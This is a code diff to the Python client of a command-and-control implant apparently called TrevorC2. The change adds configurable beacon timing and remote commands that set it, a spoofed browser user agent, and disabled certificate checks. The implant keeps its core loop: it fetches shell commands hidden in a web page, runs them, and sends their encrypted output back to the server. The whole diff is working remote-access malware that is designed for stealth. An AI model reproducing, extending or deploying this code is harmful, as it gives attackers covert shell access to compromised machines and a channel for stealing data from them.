@@ -25,12 +25,17 @@ QUERY_STRING = ("guid=")
 # STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
 STUB = ("oldcss=")
 
-# time_interval is the time used between randomly connecting back to server, for more stealth, increase this time a lot and randomize time periods
-time_interval1 = 2
-time_interval2 = 8
+# install_beacon_delay specifies the seconds to wait before connecting home for the first time after script start
+install_beacon_delay = 0
+
+# beacon_interval specifies the min and max for the random delay in seconds before the next beacon home
+min_beacon_interval = 2
+max_beacon_interval = 8
 
 # THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
 CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")
+
+HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'}
 
 # DO NOT CHANGE BELOW THIS LINE
 
@@ -107,6 +112,15 @@ cookie = http.cookiejar.CookieJar()
 ssl._create_default_https_context = ssl._create_unverified_context
 
 
+def build_request_opener(request):
+    context = ssl.create_default_context()
+    context.check_hostname = False
+    context.verify_mode = ssl.CERT_NONE
+
+    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie),
+                                       urllib.request.HTTPSHandler(context=context))
+
+
 def connect_trevor():
     # we need to register our asset first
     while 1:
@@ -116,15 +130,9 @@ def connect_trevor():
             hostname_send = base64.b64encode(hostname_send).decode('utf-8')
 
             # pipe out stdout and base64 encode it then request via a query string parameter
-            req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={
-                'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-
-            context = ssl.create_default_context()
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE
-
-            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie),
-                                                 urllib.request.HTTPSHandler(context=context))
+            req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send,
+                                         headers=HEADERS)
+            opener = build_request_opener(req)
             html = opener.open(req)
             break
 
@@ -137,16 +145,15 @@ def connect_trevor():
                 print("[!] Something went wrong trying to connect, printing error: " + str(error))
 
 
+time.sleep(install_beacon_delay)
 connect_trevor()
 
 # main call back here
 while 1:
     try:
-        time.sleep(random_interval(time_interval1, time_interval2))
-        # request with specific user agent
-        req = urllib.request.Request(SITE_URL + ROOT_PATH_QUERY, headers={
-            'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
+        time.sleep(random_interval(min_beacon_interval, max_beacon_interval))
+        req = urllib.request.Request(SITE_URL + ROOT_PATH_QUERY, headers=HEADERS)
+        opener = build_request_opener(req)
         html = opener.open(req).read().decode('utf-8')
 
         # <!-- PARAM=bm90aGluZw== --></body> -  What we split on here on encoded site
@@ -155,28 +162,36 @@ while 1:
         if parse == "nothing":
             pass
         else:
+            return_value = "nothing"
             if hostname in parse:
                 parse = parse.split(hostname + "::::")[1]
-                # execute our parsed command
-                proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                stdout_value = proc.communicate()[0]
-                stdout_value = cipher.encrypt(hostname + "::::" + stdout_value.decode('utf-8')).encode('utf-8')
-                stdout_value = base64.b64encode(stdout_value).decode('utf-8')
+                if parse.startswith("TREVORC2CFG"):
+                    if parse.startswith("TREVORC2CFG SET"):
+                        if parse.startswith("TREVORC2CFG SET BINT"):
+                            bint = parse.replace("TREVORC2CFG SET BINT ", "").split('|')
+                            min_beacon_interval = int(bint[0])
+                            max_beacon_interval = int(bint[1])
+                            return_value = "SUCCESS"
+                    elif parse.startswith("TREVORC2CFG GET"):
+                        if parse.startswith("TREVORC2CFG GET BINT"):
+                            return_value = "MIN {} MAX {}".format(min_beacon_interval, max_beacon_interval)
+                else:
+                    # execute our parsed command
+                    proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                            stdin=subprocess.PIPE)
+                    stdout_value = proc.communicate()[0]
+                    return_value = stdout_value.decode('utf-8')
+            return_value = cipher.encrypt(hostname + "::::" + return_value).encode('utf-8')
+            return_value = base64.b64encode(return_value).decode('utf-8')
 
-                # pipe out stdout and base64 encode it then request via a query string parameter
-                req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+            # pipe out stdout and base64 encode it then request via a query string parameter
+            req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + return_value,
+                                         headers=HEADERS)
+            opener = build_request_opener(req)
+            html = opener.open(req).read().decode('utf-8')
 
-                context = ssl.create_default_context()
-                context.check_hostname = False
-                context.verify_mode = ssl.CERT_NONE
-
-                opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie),
-                                                     urllib.request.HTTPSHandler(context=context))
-                html = opener.open(req).read().decode('utf-8')
-
-                # sleep random interval and let cleanup on server side
-                time.sleep(random_interval(time_interval1, time_interval2))
+            # sleep and let cleanup on server side
+            time.sleep(3)
 
     # handle exceptions and pass if the server is unavailable, but keep going
     except Exception as error:
